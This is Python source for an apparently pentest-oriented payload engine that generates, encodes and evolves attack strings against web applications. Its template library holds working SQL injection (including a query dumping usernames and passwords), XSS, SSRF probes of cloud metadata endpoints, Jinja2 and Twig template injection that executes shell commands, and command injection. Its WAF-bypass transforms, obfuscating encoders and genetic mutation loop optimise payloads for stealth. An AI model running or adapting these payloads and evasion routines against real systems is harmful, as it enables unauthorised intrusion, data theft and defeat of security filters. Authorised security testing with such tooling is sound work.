"""
Adaptive Payload Intelligence Engine
Context-aware payload generation, mutation, and evolutionary optimization.
"""

import base64
import hashlib
import json
import random
import urllib.parse
from typing import Any, Callable, Dict, List, Optional

from ai_osop.adapters.payload_mcp import PayloadMCPAdapter
from ai_osop.core.config import VulnClass
from ai_osop.core.models import Payload


class PayloadTemplateLibrary:
    """Curated payload templates organized by vulnerability class and context."""

    TEMPLATES: Dict[VulnClass, Dict[str, List[str]]] = {
        VulnClass.SQLI: {
            "error_based": [
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
                "' UNION SELECT NULL, NULL, NULL--",
                "1' OR '1'='1",
                "1' AND 1=1--",
                "1' AND 1=2--",
            ],
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL, NULL--",
                "' UNION SELECT NULL, NULL, NULL--",
                "' UNION ALL SELECT username, password FROM users--",
            ],
            "time_based": [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND pg_sleep(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
            ],
            "boolean_based": [
                "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--",
                "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>50--",
            ],
        },
        VulnClass.XSS: {
            "html_body": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
            ],
            "html_attribute": [
                '" onmouseover="alert(1)',
                "' onfocus='alert(1) autofocus",
                '" onerror="alert(1)',
            ],
            "javascript_context": [
                "';alert(1);//",
                "-alert(1)-",
                "';alert(1);'",
            ],
            "template_engine": [
                "{{7*7}}",
                "{{constructor.constructor('alert(1)')()}}",
                "<%= 7*7 %>",
            ],
        },
        VulnClass.SSRF: {
            "metadata_service": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data",
                "http://metadata.google.internal/computeMetadata/v1/",
            ],
            "internal_services": [
                "http://localhost:80",
                "http://127.0.0.1:8080",
                "http://0.0.0.0:22",
            ],
            "ip_obfuscation": [
                "http://0177.0.0.1/",
                "http://2130706433/",
                "http://0x7f000001/",
                "http://[::1]/",
            ],
        },
        VulnClass.SSTI: {
            "detection": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
            ],
            "jinja2": [
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ],
            "twig": [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            ],
        },
        VulnClass.IDOR: {
            "sequential": [
                "1",
                "2",
                "3",
                "4",
                "5",
            ],
            "predictable": [
                "user_1",
                "user_2",
                "admin",
            ],
        },
        VulnClass.JWT_ABUSE: {
            "alg_none": [
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.",
            ],
            "alg_confusion": [
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.",
            ],
        },
        VulnClass.RCE: {
            "command_injection": [
                "; id",
                "| id",
                "$(id)",
                "`id`",
            ],
            "deserialization": [
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhw",
            ],
        },
    }

    @classmethod
    def get_templates(cls, vuln_type: VulnClass, context: Optional[str] = None) -> List[str]:
        """Get templates for vulnerability class and optional context."""
        templates = cls.TEMPLATES.get(vuln_type, {})

        if context and context in templates:
            return templates[context]

        # Return all templates for vuln type
        all_templates = []
        for ctx_templates in templates.values():
            all_templates.extend(ctx_templates)
        return all_templates


class EncodingPipeline:
    """Multi-stage encoding pipeline for payload obfuscation."""

    @staticmethod
    def apply(payload: str, encoding_chain: List[str]) -> str:
        """Apply encoding chain to payload."""
        result = payload
        for encoding in encoding_chain:
            result = EncodingPipeline._encode(result, encoding)
        return result

    @staticmethod
    def _encode(data: str, encoding: str) -> str:
        encoders = {
            "url": lambda x: urllib.parse.quote(x, safe=""),
            "double_url": lambda x: urllib.parse.quote(urllib.parse.quote(x, safe=""), safe=""),
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "html_entity": lambda x: "".join(f"&#{ord(c)};" for c in x),
            "unicode": lambda x: "".join(f"\\u{ord(c):04x}" for c in x),
            "hex": lambda x: "".join(f"%{ord(c):02x}" for c in x),
            "null_byte": lambda x: x + "%00",
        }
        encoder = encoders.get(encoding, lambda x: x)
        return encoder(data)


class WAFBypassStrategies:
    """WAF evasion techniques mapped to observed blocking patterns."""

    STRATEGIES: Dict[str, List[Callable]] = {
        "keyword_filter": [
            lambda p: p.replace("UNION", "UnIoN").replace("SELECT", "SeLeCt"),
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "%0a"),
        ],
        "comment_filter": [
            lambda p: p.replace(" ", "/*!50000 " + " " * random.randint(1, 5) + " */"),
        ],
        "length_filter": [
            lambda p: p[:100] if len(p) > 100 else p,
        ],
    }

    @classmethod
    def apply_strategy(cls, payload: str, waf_profile: str) -> str:
        """Apply bypass strategy based on WAF profile."""
        strategies = cls.STRATEGIES.get(waf_profile, [])
        if strategies:
            return random.choice(strategies)(payload)
        return payload


class PayloadFitnessEvaluator:
    """Evaluate payload effectiveness based on target response."""

    @staticmethod
    def evaluate(payload: Payload, response: Dict[str, Any], waf_detected: bool = False) -> float:
        """
        Calculate fitness score [0.0, 1.0].

        Components:
        - success_indicator (40%): Did it exploit successfully?
        - response_quality (20%): Information richness
        - stealth_score (20%): WAF evasion
        - efficiency_score (10%): Payload compactness
        - novelty_bonus (10%): New bypass technique
        """
        success = PayloadFitnessEvaluator._success_indicator(response, waf_detected)
        quality = PayloadFitnessEvaluator._response_quality(response)
        stealth = 1.0 if not waf_detected else 0.3
        efficiency = PayloadFitnessEvaluator._efficiency_score(payload)
        novelty = 0.1 if payload.strategy == "genetic" else 0.0

        fitness = success * 0.4 + quality * 0.2 + stealth * 0.2 + efficiency * 0.1 + novelty * 0.1

        return min(fitness, 1.0)

    @staticmethod
    def _success_indicator(response: Dict[str, Any], waf_detected: bool) -> float:
        if waf_detected:
            return 0.0

        status = response.get("status", "unknown")
        if status == "success":
            return 1.0
        elif status == "partial":
            return 0.5
        elif "error" in str(response).lower():
            return 0.3  # Error might indicate vulnerability
        return 0.0

    @staticmethod
    def _response_quality(response: Dict[str, Any]) -> float:
        """Score based on information leakage in response."""
        score = 0.0

        if "error_message" in response:
            score += 0.3
        if "extracted_data" in response:
            score += 0.5
        if "timing_diff" in response:
            score += 0.2

        return min(score, 1.0)

    @staticmethod
    def _efficiency_score(payload: Payload) -> float:
        """Score based on payload compactness."""
        length = len(payload.content)
        if length < 50:
            return 1.0
        elif length < 200:
            return 0.7
        elif length < 500:
            return 0.4
        return 0.1


class AdaptivePayloadEngine:
    """
    Core payload intelligence engine.

    Implements:
    - Template-based generation
    - LLM-enhanced context adaptation
    - Genetic algorithm evolution
    - WAF profile learning
    """

    def __init__(
        self, mcp_adapter: Optional[PayloadMCPAdapter] = None, llm_client: Optional[Any] = None
    ):
        self.mcp = mcp_adapter
        self.llm_client = llm_client
        self.template_library = PayloadTemplateLibrary()
        self.encoding_pipeline = EncodingPipeline()
        self.waf_strategies = WAFBypassStrategies()
        self.fitness_evaluator = PayloadFitnessEvaluator()

        self._waf_profiles: Dict[str, Dict[str, Any]] = {}
        self._population_history: Dict[str, List[Payload]] = {}

    def get_payloads(self, vuln_type: VulnClass) -> List[str]:
        """Get list of payload strings for the specified vulnerability class."""
        return self.template_library.get_templates(vuln_type)

    async def generate_initial_population(
        self, vuln_type: VulnClass, context: Dict[str, Any], population_size: int = 20
    ) -> List[Payload]:
        """Generate diverse initial payload population."""
        population = []

        # 1. Template-based payloads (60%)
        templates = self.template_library.get_templates(vuln_type)
        for template in templates[: int(population_size * 0.6)]:
            payload = Payload(
                vuln_type=vuln_type,
                content=template,
                content_hash=hashlib.sha256(template.encode()).hexdigest()[:16],
                context=context,
                strategy="template",
                engagement_id=context.get("engagement_id", ""),
            )
            population.append(payload)

        # 2. Encoded variants (20%)
        if templates:
            for encoding in [["url"], ["base64"], ["html_entity"]]:
                encoded = self.encoding_pipeline.apply(templates[0], encoding)
                payload = Payload(
                    vuln_type=vuln_type,
                    content=encoded,
                    content_hash=hashlib.sha256(encoded.encode()).hexdigest()[:16],
                    encoding_chain=encoding,
                    context=context,
                    strategy="encoding",
                    engagement_id=context.get("engagement_id", ""),
                )
                population.append(payload)

        # 3. LLM-enhanced payloads (20%)
        if len(population) < population_size:
            llm_payloads = await self._llm_generate(
                vuln_type, context, population_size - len(population)
            )
            population.extend(llm_payloads)

        return population[:population_size]

    async def evolve_population(
        self,
        population: List[Payload],
        vuln_type: VulnClass,
        context: Dict[str, Any],
        generations: int = 10,
    ) -> List[Payload]:
        """
        Evolve payload population using genetic algorithm.

        Algorithm:
        1. Evaluate fitness of each payload
        2. Select top performers
        3. Crossover to create offspring
        4. Apply mutations
        5. Replace low-fitness individuals
        """
        for gen in range(generations):
            # Evaluate fitness (requires MCP execution)
            for payload in population:
                if payload.fitness_score == 0.0:
                    # Execute and evaluate
                    result = await self.mcp.analyze_response(
                        payload, {"status": "pending"}, None  # Would be actual response
                    )
                    payload.fitness_score = self.fitness_evaluator.evaluate(payload, result, False)

            # Sort by fitness
            population.sort(key=lambda p: p.fitness_score, reverse=True)

            # Selection: keep top 30%
            survivors = population[: max(1, len(population) // 3)]

            # Crossover and mutation to fill rest
            offspring = []
            while len(survivors) + len(offspring) < len(population):
                parent1, parent2 = random.sample(survivors, 2)
                child = await self._crossover(parent1, parent2, gen)
                child = await self._mutate(child, vuln_type, context)
                offspring.append(child)

            population = survivors + offspring

            # Check for convergence
            if all(p.fitness_score > 0.8 for p in population[:5]):
                break

        return population

    async def _llm_generate(
        self, vuln_type: VulnClass, context: Dict[str, Any], count: int
    ) -> List[Payload]:
        """Generate payloads using LLM for novel contexts."""
        if not self.llm_client or count <= 0:
            return []

        messages = [
            {
                "role": "system",
                "content": (
                    "Generate non-destructive security validation payload candidates. "
                    "Return strict JSON with a top-level 'payloads' array of strings. "
                    "Do not include commands that modify state, persistence, or exfiltration."
                ),
            },
            {
                "role": "user",
                "content": json.dumps(
                    {
                        "vulnerability_class": vuln_type.value,
                        "target_context": context,
                        "count": count,
                    },
                    sort_keys=True,
                ),
            },
        ]
        raw_response = await self.llm_client.complete(messages)
        candidates = self._parse_llm_payloads(raw_response, count)

        payloads: List[Payload] = []
        for candidate in candidates:
            payloads.append(
                Payload(
                    vuln_type=vuln_type,
                    content=candidate,
                    content_hash=hashlib.sha256(candidate.encode()).hexdigest()[:16],
                    context=context,
                    strategy="llm",
                    engagement_id=context.get("engagement_id", ""),
                )
            )
        return payloads

    def _parse_llm_payloads(self, raw_response: Any, count: int) -> List[str]:
        """Parse and validate LLM payload JSON output."""
        parsed = None
        if isinstance(raw_response, dict):
            content = raw_response.get("content")
            if isinstance(content, str):
                try:
                    parsed = json.loads(content)
                except json.JSONDecodeError:
                    parsed = raw_response
            else:
                parsed = raw_response
        elif isinstance(raw_response, str):
            try:
                parsed = json.loads(raw_response)
            except json.JSONDecodeError:
                return []
        else:
            return []

        if not isinstance(parsed, dict):
            return []

        values = parsed.get("payloads", [])
        if not isinstance(values, list):
            return []

        payloads = []
        for value in values:
            if isinstance(value, str) and value.strip():
                payloads.append(value.strip()[:1000])
            if len(payloads) >= count:
                break
        return payloads

    async def _crossover(self, parent1: Payload, parent2: Payload, generation: int) -> Payload:
        """Combine features from two parent payloads."""
        # Simple crossover: take encoding from one, structure from other
        content = parent1.content
        encoding = parent2.encoding_chain

        if encoding:
            content = self.encoding_pipeline.apply(content, encoding)

        return Payload(
            vuln_type=parent1.vuln_type,
            content=content,
            content_hash=hashlib.sha256(content.encode()).hexdigest()[:16],
            encoding_chain=encoding,
            context=parent1.context,
            generation=generation,
            parent_id=parent1.id,
            strategy="genetic",
            engagement_id=parent1.engagement_id,
        )

    async def _mutate(
        self, payload: Payload, vuln_type: VulnClass, context: Dict[str, Any]
    ) -> Payload:
        """Apply random mutation to payload."""
        mutations = [
            lambda p: self.encoding_pipeline.apply(p, [random.choice(["url", "hex", "null_byte"])]),
            lambda p: p.replace(" ", random.choice(["/**/", "%0a", "%09"])),
            lambda p: p.replace("SELECT", "SeLeCt") if "SELECT" in p else p,
            lambda p: p + random.choice(["--", "#", ";%00"]),
        ]

        mutated_content = random.choice(mutations)(payload.content)

        return Payload(
            vuln_type=payload.vuln_type,
            content=mutated_content,
            content_hash=hashlib.sha256(mutated_content.encode()).hexdigest()[:16],
            encoding_chain=payload.encoding_chain,
            context=payload.context,
            generation=payload.generation + 1,
            parent_id=payload.id,
            strategy="genetic",
            engagement_id=payload.engagement_id,
        )

    async def learn_waf_profile(
        self, target_hash: str, blocked_payloads: List[Payload], allowed_payloads: List[Payload]
    ) -> Dict[str, Any]:
        """
        Learn WAF signature from observed blocking behavior.

        Analyzes differences between blocked and allowed payloads
        to infer WAF rules.
        """
        profile = {
            "target_hash": target_hash,
            "blocked_patterns": [],
            "allowed_patterns": [],
            "suggested_strategies": [],
            "confidence": 0.0,
        }

        # Extract common patterns from blocked payloads
        for payload in blocked_payloads:
            profile["blocked_patterns"].append(
                {
                    "content": payload.content[:50],
                    "encoding": payload.encoding_chain,
                    "vuln_type": payload.vuln_type.value,
                }
            )

        # Extract common patterns from allowed payloads
        for payload in allowed_payloads:
            profile["allowed_patterns"].append(
                {
                    "content": payload.content[:50],
                    "encoding": payload.encoding_chain,
                    "vuln_type": payload.vuln_type.value,
                }
            )

        # Infer bypass strategies
        if blocked_payloads:
            # If plain payloads blocked, suggest encoding
            if any(not p.encoding_chain for p in blocked_payloads):
                profile["suggested_strategies"].append("encoding_variation")

            # If keywords blocked, suggest case randomization
            if any("UNION" in p.content or "SELECT" in p.content for p in blocked_payloads):
                profile["suggested_strategies"].append("case_randomization")

            profile["confidence"] = min(len(blocked_payloads) / 10, 1.0)

        self._waf_profiles[target_hash] = profile
        return profile
